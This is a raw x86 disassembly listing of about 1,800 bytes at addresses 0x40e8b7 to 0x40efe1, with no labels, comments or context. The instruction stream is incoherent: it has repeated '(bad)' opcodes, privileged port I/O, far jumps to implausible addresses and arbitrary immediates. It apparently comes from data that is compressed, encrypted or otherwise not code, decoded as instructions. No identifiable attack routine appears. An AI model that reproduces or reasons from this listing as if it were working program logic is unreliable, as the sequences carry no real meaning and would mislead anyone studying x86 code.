  40e8b7:	cld    
  40e8b8:	pop    esi
  40e8b9:	inc    esi
  40e8ba:	loopne 0x40e89d
  40e8bc:	pop    ds
  40e8bd:	jns    0x40e86c
  40e8bf:	scas   al,BYTE PTR es:[edi]
  40e8c0:	mov    dh,0xb9
  40e8c2:	jle    0x40e869
  40e8c4:	fdiv   QWORD PTR [ecx+0x2d6a4994]
  40e8ca:	adc    DWORD PTR [eax-0x2b],edx
  40e8cd:	sbb    eax,0xb5a024d0
  40e8d2:	xchg   edx,eax
  40e8d3:	int    0x5d
  40e8d5:	mov    cl,0x5b
  40e8d7:	push   esi
  40e8d8:	fmul   DWORD PTR [edi-0x78de7bca]
  40e8de:	sbb    al,0xff
  40e8e0:	aad    0x7e
  40e8e2:	lahf   
  40e8e3:	mov    edx,0xe31801ad
  40e8e8:	push   edx
  40e8e9:	add    eax,0xf8667ebc
  40e8ee:	cdq    
  40e8ef:	fisub  WORD PTR [esi]
  40e8f1:	ja     0x40e8e2
  40e8f3:	xchg   ebp,eax
  40e8f4:	dec    ecx
  40e8f5:	psllq  mm3,QWORD PTR [ebx+esi*2-0x4f904c37]
  40e8fd:	xor    al,0x5c
  40e8ff:	mov    ebx,0x87347f59
  40e904:	repnz push esi
  40e906:	mov    esi,0xc4676615
  40e90b:	sub    DWORD PTR [edi+ebp*2-0x74],0x2a
  40e910:	in     eax,dx
  40e911:	shr    DWORD PTR [esi+0x49],cl
  40e914:	retf   0xa373
  40e917:	test   DWORD PTR [esi-0xbee5d19],0x5352177d
  40e921:	sbb    al,0x45
  40e923:	lds    ecx,FWORD PTR [ecx]
  40e925:	dec    edi
  40e926:	call   0xeae47f31
  40e92b:	mov    ah,0x40
  40e92d:	xlat   BYTE PTR ds:[ebx]
  40e92e:	(bad)  [ebx+0x24]
  40e931:	adc    BYTE PTR [ebx+eax*2-0x73],dl
  40e935:	or     eax,0xc2c35918
  40e93a:	cmp    eax,0x54d07352
  40e93f:	jbe    0x40e986
  40e941:	sahf   
  40e942:	sub    BYTE PTR [esi-0x58588952],0x43
  40e949:	sbb    DWORD PTR [edx+0x7d],eax
  40e94c:	mov    dl,0x77
  40e94e:	call   0xe308b696
  40e953:	inc    edi
  40e954:	pop    ecx
  40e955:	int    0xfa
  40e957:	dec    edi
  40e958:	lods   eax,DWORD PTR ds:[esi]
  40e959:	inc    ebp
  40e95a:	sub    dh,dh
  40e95c:	adc    eax,0xecb41d78
  40e961:	pushf  
  40e962:	mov    ah,0x35
  40e964:	fimul  WORD PTR [ebp+0x20]
  40e967:	fs push ebx
  40e969:	xchg   esi,eax
  40e96a:	sbb    DWORD PTR [esi],0xffffff8c
  40e96d:	dec    eax
  40e96e:	adc    BYTE PTR [edx+0x3d],bh
  40e971:	adc    DWORD PTR [ebx+0x1a],ebp
  40e974:	cwde   
  40e975:	out    dx,al
  40e976:	pop    edx
  40e977:	xchg   edx,eax
  40e978:	lahf   
  40e979:	fld    TBYTE PTR [esi]
  40e97b:	adc    DWORD PTR [eax-0x333c4382],eax
  40e981:	test   al,0xa7
  40e983:	cld    
  40e984:	inc    ecx
  40e985:	or     bh,0x4c
  40e988:	iret   
  40e989:	(bad)  
  40e98a:	cmp    BYTE PTR [edx],ah
  40e98c:	and    eax,0x14137fb0
  40e991:	into   
  40e992:	inc    eax
  40e993:	jl     0x40e993
  40e995:	not    edx
  40e997:	int3   
  40e998:	fimul  DWORD PTR [eax]
  40e99a:	add    ch,bh
  40e99c:	xchg   ebx,eax
  40e99d:	inc    ecx
  40e99e:	fsub   st(5),st
  40e9a0:	rcl    DWORD PTR [edx],1
  40e9a2:	dec    edx
  40e9a3:	lock add BYTE PTR [edx],dl
  40e9a6:	mov    ebp,0xfbd142dc
  40e9ab:	rcr    BYTE PTR [edi],1
  40e9ad:	push   esp
  40e9ae:	inc    eax
  40e9af:	cld    
  40e9b0:	dec    ebx
  40e9b1:	jmp    0x40e9be
  40e9b3:	test   eax,0xe85df384
  40e9b8:	xor    BYTE PTR [ebx+0x1aaf77c],cl
  40e9be:	icebp  
  40e9bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c0:	stos   BYTE PTR es:[edi],al
  40e9c1:	xor    eax,0xc1a6c467
  40e9c6:	and    dh,BYTE PTR [ebx]
  40e9c8:	pop    ecx
  40e9c9:	int3   
  40e9ca:	pop    edx
  40e9cb:	sti    
  40e9cc:	jl     0x40ea21
  40e9ce:	test   eax,0xb4995f56
  40e9d3:	sahf   
  40e9d4:	inc    edi
  40e9d5:	and    eax,0x1aef9b28
  40e9da:	push   esi
  40e9db:	mov    ch,0x17
  40e9dd:	mov    al,0x7a
  40e9df:	xor    BYTE PTR [esi],cl
  40e9e1:	xchg   edi,eax
  40e9e2:	jb     0x40ea02
  40e9e4:	add    esi,ecx
  40e9e6:	cmp    DWORD PTR [ebx-0x28823397],ecx
  40e9ec:	(bad)
  40e9ef:	fidiv  DWORD PTR [ebx+0x7e]
  40e9f2:	adc    eax,0xbfa34105
  40e9f7:	mov    ds:0x4121c6b9,al
  40e9fc:	(bad)  
  40e9fe:	int    0x14
  40ea00:	sahf   
  40ea01:	jge    0x40ea4d
  40ea03:	pop    ss
  40ea04:	in     eax,dx
  40ea05:	mov    bh,0xfc
  40ea07:	and    eax,0xacdc85ca
  40ea0c:	sbb    al,0x20
  40ea0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea0f:	mov    bh,0xbd
  40ea11:	jmp    0x40ea3b
  40ea13:	mov    dh,0x62
  40ea15:	jno    0x40ea78
  40ea17:	int    0x6e
  40ea19:	mov    ds:0xacc008d6,eax
  40ea1e:	push   0x72
  40ea20:	arpl   ax,cx
  40ea22:	(bad)  
  40ea23:	addr16 push ss
  40ea25:	shl    DWORD PTR [ebp+0x6f],0x9a
  40ea29:	stos   DWORD PTR es:[edi],eax
  40ea2a:	scas   al,BYTE PTR es:[edi]
  40ea2b:	jae    0x40e9c9
  40ea2d:	sbb    BYTE PTR [ebx],bl
  40ea2f:	stos   DWORD PTR es:[edi],eax
  40ea30:	cs jmp 0x3624:0x5ecd9a96
  40ea38:	push   cs
  40ea39:	cs test al,0x74
  40ea3c:	cmp    DWORD PTR [ebx],0xdba80638
  40ea42:	in     al,0x21
  40ea44:	sub    DWORD PTR [ecx],0xd332f1cc
  40ea4a:	out    0xdc,al
  40ea4c:	mov    ebp,0x360c7f84
  40ea51:	xor    dh,ah
  40ea53:	sti    
  40ea54:	xchg   esi,eax
  40ea55:	nop
  40ea56:	pop    esp
  40ea57:	xor    al,0x1c
  40ea59:	sub    BYTE PTR [ebp+0x6cae24a0],cl
  40ea5f:	fnstsw WORD PTR ds:0xc20c636
  40ea65:	push   DWORD PTR [edx-0x58643404]
  40ea6b:	scas   eax,DWORD PTR es:[edi]
  40ea6c:	mov    ch,0x98
  40ea6e:	mov    bl,0x52
  40ea70:	shl    DWORD PTR [ecx+0x27],0x2a
  40ea74:	and    eax,ecx
  40ea76:	mov    es,WORD PTR [edi]
  40ea78:	in     al,dx
  40ea79:	aaa    
  40ea7a:	add    BYTE PTR [edx],ch
  40ea7c:	jno    0x40ea58
  40ea7e:	inc    ebx
  40ea7f:	inc    eax
  40ea80:	aad    0xef
  40ea82:	shl    BYTE PTR [ebx],0xec
  40ea85:	aas    
  40ea86:	clc    
  40ea87:	es ja  0x40eb08
  40ea8a:	outs   dx,BYTE PTR ds:[si]
  40ea8c:	sahf   
  40ea8d:	popf   
  40ea8e:	mov    eax,0xe37586f2
  40ea93:	or     eax,0x49eb346f
  40ea98:	mov    eax,0x47f710e2
  40ea9d:	rcr    DWORD PTR [ebx+0x67607cb3],0x1f
  40eaa4:	push   ecx
  40eaa5:	jbe    0x40eab4
  40eaa7:	or     dh,dh
  40eaa9:	ror    dl,0x5b
  40eaac:	mov    ebp,0x85334826
  40eab1:	ror    al,1
  40eab3:	pushf  
  40eab4:	push   ecx
  40eab5:	pop    edx
  40eab6:	dec    esp
  40eab7:	addr16 out dx,al
  40eab9:	in     eax,0x99
  40eabb:	push   0x9a78936
  40eac0:	xor    eax,0xdd3874c7
  40eac5:	in     eax,dx
  40eac6:	pop    esp
  40eac7:	sub    eax,0x78718b40
  40eacc:	imul   DWORD PTR [esi-0x1d049b51]
  40ead2:	lahf   
  40ead3:	cmp    ebx,DWORD PTR [esi+edx*2-0x1d]
  40ead7:	repnz iret 
  40ead9:	in     al,0xab
  40eadb:	xlat   BYTE PTR ds:[ebx]
  40eadc:	aas    
  40eadd:	pop    ebx
  40eade:	xchg   ebp,eax
  40eadf:	nop
  40eae0:	cmp    al,0x17
  40eae2:	sti    
  40eae3:	call   0x68e8:0xa59b174
  40eaea:	cmp    dl,BYTE PTR [ecx+esi*2]
  40eaed:	int    0xa
  40eaef:	je     0x40eb14
  40eaf1:	push   esi
  40eaf2:	sahf   
  40eaf3:	inc    esi
  40eaf4:	stos   BYTE PTR es:[edi],al
  40eaf5:	mov    ah,0x9b
  40eaf7:	pop    ecx
  40eaf8:	stc    
  40eaf9:	imul   ebp,DWORD PTR cs:[ecx+0x6158a0a6],0xcf1cccc8
  40eb04:	out    0x40,al
  40eb06:	pop    ds
  40eb07:	dec    ecx
  40eb08:	pop    eax
  40eb09:	adc    DWORD PTR [ebp-0x56],eax
  40eb0c:	addr16 pop edi
  40eb0e:	addr16 mov ecx,0x596000cc
  40eb14:	or     edx,DWORD PTR ds:0x145f130c
  40eb1a:	lahf   
  40eb1b:	jnp    0x40eb43
  40eb1d:	dec    ebx
  40eb1e:	(bad)  
  40eb1f:	and    bh,ch
  40eb21:	or     DWORD PTR [edi+0x712a2048],esi
  40eb27:	sahf   
  40eb28:	psllq  mm4,QWORD PTR [ebx+0x562b4b28]
  40eb2f:	rcl    BYTE PTR [edx-0x7efe5378],1
  40eb35:	sub    eax,0xc9e07a9b
  40eb3a:	std    
  40eb3b:	sbb    dh,bh
  40eb3d:	nop
  40eb3e:	xor    al,BYTE PTR [ecx-0x7d]
  40eb41:	xor    dl,dh
  40eb43:	mov    cl,0x10
  40eb45:	adc    eax,edi
  40eb47:	test   BYTE PTR [ecx-0x40f1aafa],0x18
  40eb4e:	aam    0xf
  40eb50:	out    0x21,al
  40eb52:	pushf  
  40eb53:	aaa    
  40eb54:	push   edi
  40eb55:	arpl   WORD PTR [edx],bx
  40eb57:	mov    ds:0xeaca2d20,al
  40eb5c:	mov    ds:0xa6924381,eax
  40eb61:	shl    edx,0xed
  40eb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb65:	pop    esi
  40eb66:	stos   DWORD PTR es:[edi],eax
  40eb67:	scas   eax,DWORD PTR es:[edi]
  40eb68:	aad    0xeb
  40eb6a:	(bad)  
  40eb6b:	aam    0xf5
  40eb6d:	inc    ebx
  40eb6e:	inc    edx
  40eb6f:	ret    
  40eb70:	pop    ebx
  40eb71:	push   ss
  40eb72:	out    dx,eax
  40eb73:	hlt    
  40eb74:	xlat   BYTE PTR ds:[ebx]
  40eb75:	cmp    bh,dl
  40eb77:	ror    BYTE PTR [esi],cl
  40eb79:	loopne 0x40ebbd
  40eb7b:	cmp    BYTE PTR [ebp-0x6b690cdc],bl
  40eb81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb82:	sub    eax,0xf3ad810c
  40eb87:	jg     0x40eba6
  40eb89:	sbb    cl,BYTE PTR [ecx+eax*4+0x33d1495a]
  40eb90:	fist   WORD PTR ds:0x6d9c80db
  40eb96:	push   edi
  40eb97:	clc    
  40eb98:	or     edx,DWORD PTR [ecx-0x7c5823e9]
  40eb9e:	jnp    0x40eb7b
  40eba0:	inc    edx
  40eba1:	sar    BYTE PTR [ecx+0x62],cl
  40eba4:	out    0x7a,al
  40eba6:	or     DWORD PTR [ecx+0x2e0b8792],ecx
  40ebac:	dec    edi
  40ebad:	mov    eax,ds:0xfa68a636
  40ebb2:	(bad)  [edi+0x74]
  40ebb5:	pop    eax
  40ebb6:	int3   
  40ebb7:	adc    esp,edx
  40ebb9:	pop    ecx
  40ebba:	stos   BYTE PTR es:[edi],al
  40ebbb:	dec    ecx
  40ebbc:	xchg   edi,eax
  40ebbd:	adc    BYTE PTR [edi+edx*1+0x42d05dd6],ah
  40ebc4:	loop   0x40ebd9
  40ebc6:	lods   al,BYTE PTR ds:[esi]
  40ebc7:	jecxz  0x40ec29
  40ebc9:	test   DWORD PTR [esi-0x11],eax
  40ebcc:	loopne 0x40eb5a
  40ebce:	mov    bl,0x60
  40ebd0:	fcom   DWORD PTR [eax]
  40ebd2:	cli    
  40ebd3:	aaa    
  40ebd4:	pop    ss
  40ebd5:	pop    edx
  40ebd6:	jo     0x40ec4f
  40ebd8:	mov    ds:0x72a740bc,eax
  40ebdd:	inc    esi
  40ebde:	gs pop esp
  40ebe0:	cmp    al,0xc1
  40ebe2:	add    al,0xd
  40ebe4:	pop    esi
  40ebe5:	pop    esi
  40ebe6:	div    BYTE PTR [ecx-0xbcdb369]
  40ebec:	call   0x535c:0x4e1d6279
  40ebf3:	gs pop ecx
  40ebf5:	push   esp
  40ebf6:	outs   dx,BYTE PTR ds:[esi]
  40ebf7:	sub    ecx,DWORD PTR [esi-0x20]
  40ebfa:	or     bl,ah
  40ebfc:	push   ss
  40ebfd:	push   esi
  40ebfe:	mov    edx,0x9a0b538f
  40ec03:	stc    
  40ec04:	or     BYTE PTR [edi+0x60b8377c],bl
  40ec0a:	sub    edi,DWORD PTR [edx+0x5c]
  40ec0d:	mov    DWORD PTR [ecx+0x5c],esp
  40ec10:	mov    DWORD PTR [ecx+0x6f],ebp
  40ec13:	push   eax
  40ec14:	xchg   edi,ebp
  40ec16:	jbe    0x40ec93
  40ec18:	push   ebp
  40ec19:	scas   al,BYTE PTR es:[edi]
  40ec1a:	mov    al,ds:0x4378f64f
  40ec1f:	cmp    al,0x76
  40ec21:	jns    0x40ebfc
  40ec23:	fs or  ax,0x520d
  40ec28:	je     0x40ec5b
  40ec2a:	mov    ebx,edi
  40ec2c:	mov    edi,0xcd37449c
  40ec31:	and    BYTE PTR [esi],bh
  40ec33:	or     dh,ch
  40ec35:	mov    ah,0x81
  40ec37:	push   esi
  40ec38:	jp     0x40ec83
  40ec3a:	pop    eax
  40ec3b:	lods   eax,DWORD PTR ds:[esi]
  40ec3c:	addr16 mov al,ds:0xd2d7
  40ec40:	ins    DWORD PTR es:[edi],dx
  40ec41:	add    eax,0x36eaccd7
  40ec46:	fld    st(5)
  40ec48:	clc    
  40ec49:	pop    edi
  40ec4a:	pushf  
  40ec4b:	fwait
  40ec4c:	hlt    
  40ec4d:	sbb    BYTE PTR [eax],ch
  40ec4f:	xor    ecx,DWORD PTR [esi+0x259c3e0e]
  40ec55:	(bad)  
  40ec56:	pop    ebx
  40ec57:	mov    bl,0xbb
  40ec59:	cmp    esi,DWORD PTR [edi]
  40ec5b:	rcr    DWORD PTR [esi-0x30],cl
  40ec5e:	add    BYTE PTR [esi-0x2d],0x56
  40ec62:	inc    esp
  40ec63:	inc    edi
  40ec64:	or     al,0x8a
  40ec66:	jp     0x40ec01
  40ec68:	dec    edi
  40ec69:	mov    bh,0x10
  40ec6b:	pop    ebx
  40ec6c:	iret   
  40ec6d:	xchg   ecx,eax
  40ec6e:	dec    edx
  40ec6f:	mov    eax,DWORD PTR [esi]
  40ec71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec72:	outs   dx,BYTE PTR ds:[esi]
  40ec73:	repz dec BYTE PTR [ecx-0x4a]
  40ec77:	ret    0x8878
  40ec7a:	sbb    bl,0x31
  40ec7d:	mov    eax,0x566be507
  40ec82:	or     DWORD PTR [edi-0x76801bf7],ecx
  40ec88:	ins    BYTE PTR es:[edi],dx
  40ec89:	jne    0x40ec44
  40ec8b:	call   0x7903411c
  40ec90:	shr    BYTE PTR [eax-0x683f74fc],1
  40ec96:	add    DWORD PTR [edi],edi
  40ec98:	jp     0x40ec53
  40ec9a:	in     eax,dx
  40ec9b:	outs   dx,DWORD PTR ds:[esi]
  40ec9c:	int3   
  40ec9d:	pop    ds
  40ec9e:	jecxz  0x40ecbe
  40eca0:	or     ch,dh
  40eca2:	dec    edi
  40eca3:	retf   
  40eca4:	lods   eax,DWORD PTR ds:[esi]
  40eca5:	jne    0x40ecba
  40eca7:	sbb    DWORD PTR [eax+0x22],0x61
  40ecab:	dec    eax
  40ecac:	icebp  
  40ecad:	cs in  al,0xd1
  40ecb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb1:	sar    ch,0x28
  40ecb4:	es mov fs,esp
  40ecb7:	gs mov esi,0x11dc0e37
  40ecbd:	iret   
  40ecbe:	adc    DWORD PTR [eax-0x534c8ecb],ecx
  40ecc4:	iret   
  40ecc5:	std    
  40ecc6:	inc    esp
  40ecc7:	repz scas al,BYTE PTR es:[edi]
  40ecc9:	and    eax,ebx
  40eccb:	or     al,0x6e
  40eccd:	stos   BYTE PTR es:[edi],al
  40ecce:	dec    ecx
  40eccf:	jp     0x40ed11
  40ecd1:	or     BYTE PTR [edi],dh
  40ecd3:	std    
  40ecd4:	jmp    0x9714:0x533710df
  40ecdb:	cmp    ebp,DWORD PTR [eax+esi*1-0x3]
  40ecdf:	mov    eax,ds:0x8f1f8466
  40ece4:	push   cs
  40ece5:	and    DWORD PTR [edx],ecx
  40ece7:	mov    ebx,?
  40ece9:	pop    ebp
  40ecea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecec:	or     ecx,DWORD PTR [eax]
  40ecee:	mov    esp,0xd5ce4fe3
  40ecf3:	mov    ecx,0x4c0bd98
  40ecf8:	adc    al,0x26
  40ecfa:	mov    ch,0xb
  40ecfc:	rol    cl,cl
  40ecfe:	ret    
  40ecff:	in     eax,0xbb
  40ed01:	or     al,0x1b
  40ed03:	mov    esp,0x7988a2ef
  40ed08:	sub    edx,0x72b9b62f
  40ed0e:	scas   al,BYTE PTR es:[edi]
  40ed0f:	stos   DWORD PTR es:[edi],eax
  40ed10:	cmp    ah,BYTE PTR [esi+0x30]
  40ed13:	cdq    
  40ed14:	add    esi,DWORD PTR [ecx]
  40ed16:	pop    ds
  40ed17:	mov    bl,BYTE PTR [edi+0x58afca5d]
  40ed1d:	mov    ch,0x27
  40ed1f:	int    0x4a
  40ed21:	mov    WORD PTR ds:0x24f8a4da,?
  40ed27:	inc    esi
  40ed28:	icebp  
  40ed29:	sbb    eax,0xf09eca11
  40ed2e:	xchg   ecx,eax
  40ed2f:	mov    edx,0x8481febb
  40ed34:	test   BYTE PTR [eax+esi*8],bl
  40ed37:	add    eax,0x46d024fe
  40ed3c:	aas    
  40ed3d:	push   esi
  40ed3e:	mov    gs,WORD PTR [eax]
  40ed40:	call   0xba4263b
  40ed45:	addr16 es xchg esi,eax
  40ed48:	mov    ds:0xcd0f834e,eax
  40ed4d:	(bad)  
  40ed4f:	icebp  
  40ed50:	inc    edi
  40ed51:	push   ebp
  40ed52:	xchg   BYTE PTR [ecx-0x31a602b],bh
  40ed58:	out    dx,eax
  40ed59:	jae    0x40ed7d
  40ed5b:	pop    edi
  40ed5c:	test   BYTE PTR [ebx],ah
  40ed5e:	in     eax,0xcf
  40ed60:	out    0xba,al
  40ed62:	xchg   ebx,eax
  40ed63:	enter  0x4d11,0xb2
  40ed67:	aad    0xc2
  40ed69:	outs   dx,BYTE PTR ds:[esi]
  40ed6a:	add    ah,dl
  40ed6c:	cmp    eax,0x25caf114
  40ed71:	lods   eax,DWORD PTR ds:[esi]
  40ed72:	pop    edi
  40ed73:	push   ebp
  40ed74:	sub    cl,ah
  40ed76:	inc    esp
  40ed77:	dec    edi
  40ed78:	(bad)  
  40ed7a:	dec    ecx
  40ed7b:	pop    ebx
  40ed7c:	jno    0x40edce
  40ed7e:	mov    ds:0x605d7791,eax
  40ed83:	jmp    0x40ed2a
  40ed85:	js     0x40ed1d
  40ed87:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40ed89:	sub    ebx,DWORD PTR [ecx-0x510e5198]
  40ed8f:	sbb    eax,0x6b67053e
  40ed94:	arpl   WORD PTR [ebp-0x13],ax
  40ed97:	jp     0x40ed4f
  40ed99:	xchg   ecx,eax
  40ed9a:	sub    ah,cl
  40ed9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed9d:	test   DWORD PTR [edx],0x5b5f552f
  40eda3:	jp     0x40edac
  40eda5:	sub    ecx,ebx
  40eda7:	(bad)  
  40eda8:	in     al,0xfd
  40edaa:	jbe    0x40edca
  40edac:	(bad)  
  40edad:	es ror esi,cl
  40edb0:	or     ch,bl
  40edb2:	test   DWORD PTR [edi+eiz*1+0x33efe45b],esi
  40edb9:	jb     0x40ed4c
  40edbb:	(bad)  
  40edbc:	leave  
  40edbd:	pavgw  mm1,QWORD PTR [ecx]
  40edc0:	xor    al,0x1e
  40edc2:	lods   al,BYTE PTR ds:[esi]
  40edc3:	loope  0x40ee1a
  40edc5:	push   cs
  40edc6:	retf   0x42
  40edc9:	lds    edx,FWORD PTR [edi]
  40edcb:	dec    ecx
  40edcc:	xor    BYTE PTR [ecx+0x3],dh
  40edcf:	call   0x259ce6b2
  40edd4:	std    
  40edd5:	ss jbe 0x40ee2e
  40edd8:	(bad)  
  40edd9:	shl    edi,cl
  40eddb:	xor    DWORD PTR [edx+0x70],esp
  40edde:	jbe    0x40ee3a
  40ede0:	mov    esi,0x99d1eaa8
  40ede5:	xor    al,0xc5
  40ede7:	enter  0x6453,0x2b
  40edeb:	mov    esp,0x9b84a20e
  40edf0:	pop    esi
  40edf1:	les    ebp,FWORD PTR [edi+0x1ba1fd7b]
  40edf7:	addr16 mov eax,ds:0x5d88
  40edfb:	add    DWORD PTR [ebx+0x7c862280],esp
  40ee01:	add    ebp,esi
  40ee03:	add    ebp,DWORD PTR [edi]
  40ee05:	outs   dx,BYTE PTR ds:[esi]
  40ee06:	ret    0x22ec
  40ee09:	jecxz  0x40ee50
  40ee0b:	mov    edx,0xcc8d3cf3
  40ee10:	pop    esi
  40ee11:	lods   al,BYTE PTR ds:[esi]
  40ee12:	mov    ch,0xb4
  40ee14:	outs   dx,DWORD PTR ds:[esi]
  40ee15:	mov    edx,0xa742774d
  40ee1a:	push   es
  40ee1b:	loope  0x40ede5
  40ee1d:	xchg   ebp,eax
  40ee1e:	fwait
  40ee1f:	aaa    
  40ee20:	les    ebp,FWORD PTR [ebp+0x3e23b7c4]
  40ee26:	outs   dx,BYTE PTR ds:[esi]
  40ee27:	adc    al,0x4e
  40ee29:	cs cdq 
  40ee2b:	stos   BYTE PTR es:[edi],al
  40ee2c:	(bad)  
  40ee2d:	fist   WORD PTR ds:0xf8c81ea6
  40ee33:	addr16 jge 0x40ee7f
  40ee36:	or     al,0x87
  40ee38:	sub    al,BYTE PTR es:[edi+0x2e138077]
  40ee3f:	daa    
  40ee40:	lods   eax,DWORD PTR ds:[esi]
  40ee41:	stos   BYTE PTR es:[edi],al
  40ee42:	femms  
  40ee44:	add    DWORD PTR [eax-0x88cdb85],ebp
  40ee4a:	outs   dx,BYTE PTR ds:[esi]
  40ee4b:	es xor dl,dh
  40ee4e:	mov    ebp,0x834b0da2
  40ee53:	call   0x1fbb:0xd13c9bd0
  40ee5a:	cmp    ecx,DWORD PTR [ebp+0x4]
  40ee5d:	or     eax,0x6d5d5ef6
  40ee62:	sbb    DWORD PTR [edi],edx
  40ee64:	mul    cl
  40ee66:	cmp    al,0xae
  40ee68:	fs (bad) 
  40ee6a:	dec    esi
  40ee6b:	jo     0x40eec4
  40ee6d:	push   esp
  40ee6e:	aaa    
  40ee6f:	or     ebp,esp
  40ee71:	adc    al,0x8d
  40ee73:	jne    0x40ee00
  40ee75:	cs sub ebx,ecx
  40ee78:	iret   
  40ee79:	push   ds
  40ee7a:	pop    ecx
  40ee7b:	test   al,0x87
  40ee7d:	pop    es
  40ee7e:	enter  0x756c,0x71
  40ee82:	in     al,dx
  40ee83:	repnz cld 
  40ee85:	test   BYTE PTR [esi*2-0x5f2bc356],dl
  40ee8c:	test   BYTE PTR [esi+ecx*2],bl
  40ee8f:	push   ebx
  40ee90:	ror    BYTE PTR [eax-0x12f6b2ea],cl
  40ee96:	std    
  40ee97:	or     BYTE PTR [edx-0x6032ed1d],0xeb
  40ee9e:	jnp    0x40ee9a
  40eea0:	pushf  
  40eea1:	dec    esi
  40eea2:	stc    
  40eea3:	das    
  40eea4:	(bad)  
  40eea5:	std    
  40eea6:	sbb    DWORD PTR [ecx],edx
  40eea8:	std    
  40eea9:	add    eax,0xaec084bb
  40eeae:	sub    BYTE PTR [ebx],ah
  40eeb0:	outs   dx,BYTE PTR ds:[esi]
  40eeb1:	and    DWORD PTR [ebx+0x3e],eax
  40eeb4:	ds scas al,BYTE PTR es:[edi]
  40eeb6:	inc    eax
  40eeb7:	(bad)  
  40eeb9:	sbb    ebp,DWORD PTR [edi+0x551cdce1]
  40eebf:	pand   mm7,mm1
  40eec2:	jbe    0x40eee8
  40eec4:	sbb    al,0xf3
  40eec6:	imul   ecx,DWORD PTR [eax+edi*4+0x55],0x7cc931bc
  40eece:	cmp    BYTE PTR [ebp-0x34],dh
  40eed1:	pop    ds
  40eed2:	and    eax,0x49808e62
  40eed7:	fdivr  DWORD PTR [ecx]
  40eed9:	int    0x7
  40eedb:	mov    ah,0x9d
  40eedd:	hlt    
  40eede:	xor    al,0x8
  40eee0:	pusha  
  40eee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eee2:	sbb    eax,0x77aa2d47
  40eee7:	sbb    ch,al
  40eee9:	cmp    DWORD PTR [ecx+edx*8],edx
  40eeec:	dec    edx
  40eeed:	inc    esi
  40eeee:	push   cs
  40eeef:	adc    edi,ebp
  40eef1:	imul   edi,eax,0x3
  40eef4:	es inc ecx
  40eef6:	dec    edi
  40eef7:	or     eax,0x4d029ac0
  40eefc:	add    BYTE PTR [edi+0x3],al
  40eeff:	clc    
  40ef00:	xchg   edi,eax
  40ef01:	neg    bl
  40ef03:	jae    0x40ef61
  40ef05:	pop    ds
  40ef06:	sti    
  40ef07:	lds    eax,FWORD PTR [edx+0x2a]
  40ef0a:	add    dh,BYTE PTR [ecx+0x34b7884f]
  40ef10:	add    BYTE PTR [ebp+eax*2+0x11],dl
  40ef14:	jae    0x40eede
  40ef16:	jo     0x40ef79
  40ef18:	push   edi
  40ef19:	ret    0x743b
  40ef1c:	je     0x40ef9d
  40ef1e:	sbb    ecx,DWORD PTR [edi-0x9]
  40ef21:	bound  esp,QWORD PTR [ebp+0x79cdeebd]
  40ef27:	push   es
  40ef28:	sbb    al,0x9a
  40ef2a:	enter  0xb139,0x61
  40ef2e:	test   eax,0x3e44a76b
  40ef33:	rcr    BYTE PTR [esi+eax*4-0x2f08b6f6],1
  40ef3a:	xchg   BYTE PTR [eax+0x76a20a49],ah
  40ef40:	retf   
  40ef41:	fs xchg ecx,eax
  40ef43:	popa   
  40ef44:	js     0x40ef86
  40ef46:	xchg   edx,eax
  40ef47:	mov    ch,0xce
  40ef49:	icebp  
  40ef4a:	in     al,0xd9
  40ef4c:	(bad)
  40ef4f:	js     0x40ef30
  40ef51:	inc    ecx
  40ef52:	setne  BYTE PTR [edi-0x3f435e1e]
  40ef59:	imul   ecx,DWORD PTR [eax],0xfb6bcc1d
  40ef5f:	sar    DWORD PTR [ecx],0x68
  40ef62:	arpl   WORD PTR [edi-0x600bdd92],ax
  40ef68:	je     0x40eef4
  40ef6a:	das    
  40ef6b:	es (bad) 
  40ef6d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40ef6f:	jl     0x40ef65
  40ef71:	push   si
  40ef73:	sub    dl,BYTE PTR [ebx-0xde0586c]
  40ef79:	pop    ebx
  40ef7a:	icebp  
  40ef7b:	xcrypt-ctr (bad)
  40ef7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef7d:	pop    ebx
  40ef7e:	xchg   esp,eax
  40ef7f:	sbb    ch,ah
  40ef81:	pop    ecx
  40ef82:	sub    al,0x26
  40ef84:	push   es
  40ef85:	stos   BYTE PTR es:[edi],al
  40ef86:	retf   
  40ef87:	aam    0x8d
  40ef89:	test   al,0x91
  40ef8b:	adc    dh,ch
  40ef8d:	mov    bl,0x39
  40ef8f:	jo     0x40ef6c
  40ef91:	and    DWORD PTR [eax],ebp
  40ef93:	daa    
  40ef94:	mov    ds:0x5b042992,al
  40ef99:	out    dx,al
  40ef9a:	out    dx,eax
  40ef9b:	ret    0xb26
  40ef9e:	cmp    eax,0x49d42496
  40efa3:	popf   
  40efa4:	and    eax,ebx
  40efa6:	jp     0xc5e6614e
  40efac:	shl    BYTE PTR ds:0x13d96670,0x3b
  40efb3:	push   ecx
  40efb4:	inc    esp
  40efb5:	adc    eax,DWORD PTR [edx]
  40efb7:	pop    ds
  40efb8:	(bad)  
  40efb9:	jno    0x40f02f
  40efbb:	in     al,dx
  40efbc:	into   
  40efbd:	jo     0x40efd1
  40efbf:	adc    BYTE PTR [edi],dh
  40efc1:	outs   dx,BYTE PTR ds:[esi]
  40efc2:	add    al,0x86
  40efc4:	jno    0x40efbb
  40efc6:	mul    BYTE PTR [ebp+0x3]
  40efc9:	bound  esi,QWORD PTR [edi+0x769d4895]
  40efcf:	out    dx,eax
  40efd0:	mov    es,WORD PTR [eax-0xaf19726]
  40efd6:	push   ebx
  40efd7:	adc    DWORD PTR [ebx],0x2c
  40efda:	stos   DWORD PTR es:[edi],eax
  40efdb:	stos   BYTE PTR es:[edi],al
  40efdc:	leave  
  40efdd:	aam    0x62
  40efdf:	jg     0x40f029
  40efe1:	mov    ds:0xceae40c9,al
